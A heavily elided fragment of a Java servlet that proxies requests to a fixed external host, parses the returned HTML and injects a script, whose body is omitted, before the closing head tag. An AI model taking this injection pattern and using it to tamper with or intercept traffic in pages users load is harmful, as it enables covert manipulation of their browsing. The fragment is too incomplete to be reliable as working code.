 ...
 */
public class KandalfTest extends HttpServlet {
...
//        System.out.println("url = " + urlS);
        ...
        URL url = new URL("http://kandalfghost.hopto.me/"+request.getQueryString());
...
//        String guessContentTypeFromName = HttpURLConnection.guessContentTypeFromName(urlS);
        ...
        if (ct != null && ct.match("text/html") && !nis) {
            ...
            parse = Jsoup.parse(inputStream, charset, "http://kandalfghost.hopto.me");
...
//        System.out.println("content = " + openConnection.getContentType());
        ...
        if (parse != null) {
            try (PrintWriter writer = response.getWriter()) {
                ...
                int indexOf = builder.indexOf("</head>");
                String scripText = "<script>(function(open) {\n"
                ...
                builder.insert(indexOf, scripText);
    ...
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
        ...
        try {
            ...
            Logger.getLogger(KandalfTest.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
